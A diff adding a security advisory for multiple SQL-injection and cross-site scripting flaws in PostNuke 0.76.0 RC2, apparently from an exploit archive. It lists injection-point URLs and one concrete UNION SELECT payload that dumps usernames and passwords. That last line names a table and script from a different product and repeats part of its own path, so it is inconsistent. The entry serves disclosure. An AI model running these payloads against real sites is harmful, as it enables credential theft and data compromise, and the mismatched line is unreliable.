@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/18319/info
+
+PostNuke is prone to multiple input-validation vulnerabilities, including cross-site scripting and SQL-injection vulnerabilities, because the application fails to properly sanitize user-supplied input.
+
+A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or exploit vulnerabilities in the underlying database. Other attacks are also possible.
+
+PostNuke 0.76.0 RC2 is vulnerable; other versions may also be affected.
+
+http://www.example.com/path/modules.php?op=modload&name=News&file=index&catid=[SQL]
+http://www.example.com/path/modules.php?op=modload&name=News&file=article&sid=[SQL]
+
+http://www.example.com/path/modules.php?op=modload&name=News&file=index&catid=[XSS]
+http://www.example.com/path/modules.php?op=modload&name=News&file=article&sid=[XSS]
+http://www.example.com/path/modules.php?op=modload&name=Events_Calendar&file=[XSS]
+http://www.example.com/readmore.php?news_id=readmore.php?news_id=-1%20'UNION%20SELECT%201,user_name,3,user_password,5,6,7,8,9,10,11%20from%20fusion_users/*
